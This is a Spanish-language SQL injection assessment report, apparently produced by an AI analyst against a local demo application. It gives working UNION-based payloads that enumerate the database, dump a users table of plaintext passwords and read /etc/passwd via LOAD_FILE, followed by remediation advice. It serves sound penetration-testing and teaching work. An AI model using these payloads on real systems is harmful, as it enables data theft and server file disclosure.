# Informe de Análisis de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:58:17  
**Analista:** Copilot (claude-sonnet-4.6)  
**Tipo de análisis:** SQL Injection (SQLi)

---

## 1. Resumen Ejecutivo

Se ha detectado y explotado con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del endpoint principal (`/?id=`). La aplicación concatena directamente la entrada del usuario en la consulta SQL sin ningún tipo de saneamiento o uso de consultas preparadas, permitiendo extracción total de datos de la base de datos, enumeración de privilegios y lectura de archivos del sistema.

**Severidad:** 🔴 CRÍTICA (CVSS 9.8+)

---

## 2. Información del Sistema

| Campo | Valor |
|-------|-------|
| Servidor web | Apache/2.4.65 (Debian) |
| Lenguaje | PHP/8.1.33 |
| Base de datos | MariaDB 10.11.14-ubu2204 |
| Usuario DB | root@172.18.0.3 |
| Archivo vulnerable | `/var/www/html/low.php` |

---

## 3. Vulnerabilidad Detectada

### 3.1 Descripción

**Tipo:** SQL Injection (Error-Based + UNION-Based)  
**Parámetro vulnerable:** `id` (método GET)  
**URL:** `http://web.dev.local:8083/?id=<payload>&Submit=Submit`

### 3.2 Prueba de concepto - Detección

Al añadir una comilla simple al valor del parámetro `id`, la aplicación devuelve un error SQL que expone la consulta interna:

**Request:**
```
GET /?id=1'&Submit=Submit
```

**Error devuelto:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

Esto confirma que:
1. La entrada no está sanitizada.
2. Los errores SQL se muestran al usuario (error verbose).
3. La aplicación usa `mysqli_query()` sin sentencias preparadas.

### 3.3 Determinación del número de columnas

Mediante `ORDER BY` se determinó que la consulta original retorna **2 columnas**:

```
GET /?id=1' ORDER BY 2#  → Resultado correcto (John Doe)
GET /?id=1' ORDER BY 3#  → Error: "Unknown column '3' in 'ORDER BY'"
```

---

## 4. Explotación

### 4.1 Extracción de versión y usuario de base de datos

**Payload:**
```sql
0' UNION SELECT version(),user()#
```

**Resultado:**
- Versión DB: `10.11.14-MariaDB-ubu2204`
- Usuario DB: `root@172.18.0.3`

### 4.2 Enumeración de bases de datos

**Payload:**
```sql
0' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata#
```

**Bases de datos encontradas:**
- `information_schema`
- `sqli_demo` ← base de datos principal de la aplicación
- `sys`
- `mysql`
- `performance_schema`

### 4.3 Enumeración de tablas

**Payload:**
```sql
0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema='sqli_demo'#
```

**Tablas en `sqli_demo`:**
- `users`

### 4.4 Enumeración de columnas

**Payload:**
```sql
0' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users' AND table_schema='sqli_demo'#
```

**Columnas de `users`:**
- `user_id`, `first_name`, `last_name`, `username`, `password`, `email`

### 4.5 Volcado completo de la tabla `users`

**Payload:**
```sql
0' UNION SELECT group_concat(user_id,':',first_name,':',last_name,':',username,':',password,':',email SEPARATOR '|'),2 FROM sqli_demo.users#
```

**Datos extraídos:**

| user_id | first_name | last_name | username | password | email |
|---------|-----------|-----------|----------|----------|-------|
| 1 | John | Doe | admin | password123 | admin@example.com |
| 2 | Jane | Smith | jsmith | secret456 | jane@example.com |
| 3 | Bob | Johnson | bjohnson | mypass789 | bob@example.com |
| 4 | Alice | Williams | awilliams | qwerty123 | alice@example.com |
| 5 | Charlie | Brown | cbrown | password | charlie@example.com |
| 6 | Diana | Davis | ddavis | secure123 | diana@example.com |
| 7 | Eve | Miller | emiller | hackme | eve@example.com |
| 8 | Frank | Wilson | fwilson | admin123 | frank@example.com |

⚠️ **Las contraseñas están almacenadas en texto plano** (sin hashing).

### 4.6 Lectura de archivos del sistema (LOAD_FILE)

El usuario de base de datos tiene el privilegio `FILE`, lo que permite leer archivos del sistema operativo:

**Payload:**
```sql
0' UNION SELECT load_file('/etc/passwd'),2#
```

**Resultado:** Contenido completo de `/etc/passwd` expuesto.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### 4.7 Privilegios del usuario de base de datos

El usuario `root` tiene **todos los privilegios** sobre todas las bases de datos, incluyendo FILE, SUPER, CREATE USER, etc.

---

## 5. Impacto

| Vector | Impacto |
|--------|---------|
| Confidencialidad | **CRÍTICO** - Extracción completa de todos los datos de la BD |
| Integridad | **ALTO** - Posibilidad de modificar/eliminar datos |
| Disponibilidad | **ALTO** - Posibilidad de DROP TABLE / DROP DATABASE |
| Sistema de archivos | **ALTO** - Lectura de archivos del servidor vía LOAD_FILE |
| Escalada de privilegios | **ALTO** - Usuario root con todos los privilegios |

---

## 6. Causa Raíz

El código vulnerable en `/var/www/html/low.php` probablemente construye la consulta SQL de forma insegura:

```php
// Código vulnerable (ejemplo típico)
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## 7. Recomendaciones

### 7.1 Solución inmediata - Usar consultas preparadas (Prepared Statements)

```php
// Código seguro
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

### 7.2 Otras medidas de mitigación

1. **Validación de entrada:** Validar que `id` sea un entero antes de usarlo.
2. **Principio de mínimo privilegio:** El usuario de BD no debe ser `root`; crear un usuario con solo `SELECT` en la tabla necesaria.
3. **Deshabilitar `LOAD_FILE`:** Revocar el privilegio `FILE` al usuario de BD.
4. **Ocultar errores SQL:** Desactivar `display_errors` en producción y usar logging interno.
5. **Hashear contraseñas:** Usar `password_hash()` con bcrypt para almacenar contraseñas.
6. **WAF:** Implementar un Web Application Firewall para detectar payloads SQLi.
7. **ORM:** Considerar el uso de un ORM (Eloquent, Doctrine) que gestione el escaping automáticamente.

---

## 8. Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **crítica de SQL Injection** que permite a un atacante no autenticado extraer todos los datos de la base de datos (incluyendo credenciales en texto plano de 8 usuarios), leer archivos del sistema operativo y potencialmente comprometer completamente el servidor. Se requiere remediación inmediata.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
